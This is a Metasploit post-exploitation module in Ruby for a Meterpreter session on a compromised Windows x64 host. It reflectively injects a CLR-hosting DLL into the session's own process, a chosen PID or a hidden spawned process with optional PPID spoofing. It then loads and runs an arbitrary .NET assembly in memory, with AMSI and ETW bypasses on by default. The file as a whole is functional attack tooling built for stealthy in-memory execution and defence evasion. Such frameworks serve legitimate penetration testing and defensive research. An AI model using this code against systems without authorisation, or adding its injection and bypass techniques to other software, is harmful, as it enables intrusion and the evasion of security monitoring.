##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Exploit::Retry
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Dotnet

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Execute .net Assembly (x64 only)',
        'Description' => %q{
          This module executes a .NET assembly in memory. It
          reflectively loads a dll that will host CLR, then it copies
          the assembly to be executed into memory. Credits for AMSI
          bypass to Rastamouse (@_RastaMouse)
        },
        'License' => MSF_LICENSE,
        'Author' => 'b4rtik',
        'Arch' => [ARCH_X64],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [['Windows x64', { 'Arch' => ARCH_X64 }]],
        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
        'DefaultTarget' => 0,
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_attach
              stdapi_sys_process_execute
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_kill
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_write
              stdapi_sys_process_thread_create
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    spawn_condition = ['TECHNIQUE', '==', 'SPAWN_AND_INJECT']
    inject_condition = ['TECHNIQUE', '==', 'INJECT']

    register_options(
      [
        OptEnum.new('TECHNIQUE', [true, 'Technique for executing assembly', 'SELF', ['SELF', 'INJECT', 'SPAWN_AND_INJECT']]),
        OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptBool.new('AMSIBYPASS', [true, 'Enable AMSI bypass', true]),
        OptBool.new('ETWBYPASS', [true, 'Enable ETW bypass', true]),

        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe'], conditions: spawn_condition),
        OptBool.new('USETHREADTOKEN', [false, 'Spawn process using the current thread impersonation', true], conditions: spawn_condition),
        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process (no PPID spoofing if unset)', nil], conditions: spawn_condition),

        OptInt.new('PID', [false, 'PID to inject into', nil], conditions: inject_condition),
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL', [true, 'Kill the launched process at the end of the task', true], conditions: spawn_condition)
      ]
    )

    self.terminate_process = false
    self.hprocess = nil
    self.handles_to_close = []
  end

  def find_required_clr(exe_path)
    filecontent = File.read(exe_path).bytes
    sign = 'v4.0.30319'.bytes
    filecontent.each_with_index do |_item, index|
      sign.each_with_index do |subitem, indexsub|
        break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)

        if indexsub == 9
          vprint_status('CLR version required: v4.0.30319')
          return 'v4.0.30319'
        end
      end
    end
    vprint_status('CLR version required: v2.0.50727')
    'v2.0.50727'
  end

  def check_requirements(clr_req, installed_dotnet_versions)
    installed_dotnet_versions.each do |fi|
      if clr_req == 'v4.0.30319'
        if fi[0] == '4'
          vprint_status('Requirements ok')
          return true
        end
      elsif clr_req == 'v2.0.50727'
        if fi[0] == '3' || fi[0] == '2'
          vprint_status('Requirements ok')
          return true
        end
      end
    end
    print_error('Required dotnet version not present')
    false
  end

  def run
    exe_path = datastore['DOTNET_EXE']

    unless File.file?(exe_path)
      fail_with(Failure::BadConfig, 'Assembly not found')
    end
    installed_dotnet_versions = get_dotnet_versions
    vprint_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
    if installed_dotnet_versions == []
      fail_with(Failure::BadConfig, 'Target has no .NET framework installed')
    end
    rclr = find_required_clr(exe_path)
    if check_requirements(rclr, installed_dotnet_versions) == false
      fail_with(Failure::BadConfig, 'CLR required for assembly not installed')
    end

    if sysinfo.nil?
      fail_with(Failure::BadConfig, 'Session invalid')
    else
      print_status("Running module against #{sysinfo['Computer']}")
    end

    execute_assembly(exe_path, rclr)
  end

  def cleanup
    if terminate_process && !hprocess.nil? && !hprocess.pid.nil?
      print_good("Killing process #{hprocess.pid}")
      begin
        client.sys.process.kill(hprocess.pid)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_warning("Error while terminating process: #{e}")
        print_warning('Process may already have terminated')
      end
    end

    handles_to_close.each(&:close)
  end

  def sanitize_process_name(process_name)
    if process_name.split(//).last(4).join.eql? '.exe'
      out_process_name = process_name
    else
      "#{process_name}.exe"
    end
    out_process_name
  end

  def pid_exists(pid)
    host_processes = client.sys.process.get_processes
    if host_processes.empty?
      print_bad('No running processes found on the target host.')
      return false
    end

    theprocess = host_processes.find { |x| x['pid'] == pid }

    !theprocess.nil?
  end

  def launch_process
    if datastore['PROCESS'].nil?
      fail_with(Failure::BadConfig, 'Spawn and inject selected, but no process was specified')
    end

    ppid_selected = datastore['PPID'] != 0 && !datastore['PPID'].nil?
    if ppid_selected && !pid_exists(datastore['PPID'])
      fail_with(Failure::BadConfig, "Process #{datastore['PPID']} was not found")
    elsif ppid_selected
      print_status("Spoofing PPID #{datastore['PPID']}")
    end

    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} to host CLR...")

    begin
      process = client.sys.process.execute(process_name, nil, {
        'Channelized' => false,
        'Hidden' => true,
        'UseThreadToken' => !(!datastore['USETHREADTOKEN']),
        'ParentPid' => datastore['PPID']
      })
      hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::BadConfig, "Unable to launch process: #{e}")
    end

    print_good("Process #{hprocess.pid} launched.")
    hprocess
  end

  def inject_hostclr_dll(process)
    print_status("Reflectively injecting the Host DLL into #{process.pid}..")

    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting Host into #{process.pid}...")
    # Memory management note: this memory is freed by the C++ code itself upon completion
    # of the assembly
    inject_dll_into_process(process, library_path)
  end

  def open_process(pid)
    if (pid == 0) || pid.nil?
      fail_with(Failure::BadConfig, 'Inject technique selected, but no PID set')
    end

    if pid_exists(pid)
      print_status("Opening handle to process #{pid}...")
      begin
        hprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
      rescue Rex::Post::Meterpreter::RequestError => e
        fail_with(Failure::BadConfig, "Unable to access process #{pid}: #{e}")
      end
      print_good('Handle opened')
      hprocess
    else
      fail_with(Failure::BadConfig, 'PID not found')
    end
  end

  def check_process_suitability(pid)
    process = session.sys.process.each_process.find { |i| i['pid'] == pid }
    if process.nil?
      fail_with(Failure::BadConfig, 'PID not found')
    end

    arch = process['arch']

    if arch != ARCH_X64
      fail_with(Failure::BadConfig, 'execute_dotnet_assembly currently only supports x64 processes')
    end
  end

  def execute_assembly(exe_path, clr_version)
    if datastore['TECHNIQUE'] == 'SPAWN_AND_INJECT'
      self.hprocess = launch_process
      self.terminate_process = datastore['KILL']
      check_process_suitability(hprocess.pid)
    else
      if datastore['TECHNIQUE'] == 'INJECT'
        inject_pid = datastore['PID']
      elsif datastore['TECHNIQUE'] == 'SELF'
        inject_pid = client.sys.process.getpid
      end
      check_process_suitability(inject_pid)

      self.hprocess = open_process(inject_pid)
    end

    handles_to_close.append(hprocess)

    begin
      exploit_mem, offset = inject_hostclr_dll(hprocess)

      pipe_suffix = Rex::Text.rand_text_alphanumeric(8)
      pipe_name = "\\\\.\\pipe\\#{pipe_suffix}"
      appdomain_name = Rex::Text.rand_text_alpha(9)
      vprint_status("Connecting with CLR via #{pipe_name}")
      vprint_status("Running in new AppDomain: #{appdomain_name}")
      assembly_mem = copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, hprocess)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::PayloadFailed, "Error while allocating memory: #{e}")
    end

    print_status('Executing...')
    begin
      thread = hprocess.thread.create(exploit_mem + offset, assembly_mem)
      handles_to_close.append(thread)

      pipe = nil
      retry_until_truthy(timeout: 15) do
        pipe = client.fs.file.open(pipe_name)
        true
      rescue Rex::Post::Meterpreter::RequestError => e
        if e.code != Msf::WindowsError::FILE_NOT_FOUND
          # File not found is expected, since the pipe may not be set up yet.
          # Any other error would be surprising.
          vprint_error("Error while attaching to named pipe: #{e.inspect}")
        end
        false
      end

      if pipe.nil?
        fail_with(Failure::PayloadFailed, 'Unable to connect to output stream')
      end

      basename = File.basename(datastore['DOTNET_EXE'])
      dir = Msf::Config.log_directory + File::SEPARATOR + 'dotnet'
      unless Dir.exist?(dir)
        Dir.mkdir(dir)
      end
      logfile = dir + File::SEPARATOR + "log_#{basename}_#{Time.now.strftime('%Y%m%d%H%M%S')}"
      read_output(pipe, logfile)
    # rubocop:disable Lint/RescueException
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::PayloadFailed, e.message)
    rescue ::Exception => e
      # rubocop:enable Lint/RescueException
      unless terminate_process
        # We don't provide a trigger to the assembly to self-terminate, so it will continue on its merry way.
        # Because named pipes don't have an infinite buffer, if too much additional output is provided by the
        # assembly, it will block until we read it. So it could hang at an unpredictable location.
        # Also, since we can't confidently clean up the memory of the DLL that may still be running, there
        # will also be a memory leak.

        reason = 'terminating due to exception'
        if e.is_a?(::Interrupt)
          reason = 'interrupted'
        end

        print_warning('****')
        print_warning("Execution #{reason}. Assembly may still be running. However, as we are no longer retrieving output, it may block at an unpredictable location.")
        print_warning('****')
      end

      raise
    end

    print_good('Execution finished.')
  end

  def copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, process)
    print_status("Host injected. Copy assembly into #{process.pid}...")
    # Structure:
    # - Packed metadata (string/data lengths, flags)
    # - Pipe Name
    # - Appdomain Name
    # - CLR Version
    # - Param data
    # - Assembly data
    assembly_size = File.size(exe_path)

    cln_params = ''
    cln_params << datastore['ARGUMENTS'] unless datastore['ARGUMENTS'].nil?
    cln_params << "\x00"

    pipe_name = pipe_name.encode(::Encoding::ASCII_8BIT)
    appdomain_name = appdomain_name.encode(::Encoding::ASCII_8BIT)
    clr_version = clr_version.encode(::Encoding::ASCII_8BIT)
    params = [
      pipe_name.bytesize,
      appdomain_name.bytesize,
      clr_version.bytesize,
      cln_params.length,
      assembly_size,
      datastore['AMSIBYPASS'] ? 1 : 0,
      datastore['ETWBYPASS'] ? 1 : 0,
    ].pack('IIIIICC')

    payload = params
    payload += pipe_name
    payload += appdomain_name
    payload += clr_version
    payload += cln_params
    payload += File.read(exe_path)

    payload_size = payload.length

    # Memory management note: this memory is freed by the C++ code itself upon completion
    # of the assembly
    allocated_memory = process.memory.allocate(payload_size, PROT_READ | PROT_WRITE)
    process.memory.write(allocated_memory, payload)
    print_status('Assembly copied.')
    allocated_memory
  end

  def read_output(pipe, logfilename)
    print_status('Start reading output')

    print_status("Writing output to #{logfilename}")
    logfile = File.open(logfilename, 'wb')

    begin
      loop do
        output = pipe.read(1024)
        if !output.nil? && !output.empty?
          print(output)
          logfile.write(output)
        end
        break if output.nil? || output.empty?
      end
    rescue ::StandardError => e
      print_error("Exception: #{e.inspect}")
    end

    logfile.close
    print_status('End output.')
  end

  attr_accessor :terminate_process, :hprocess, :handles_to_close
end
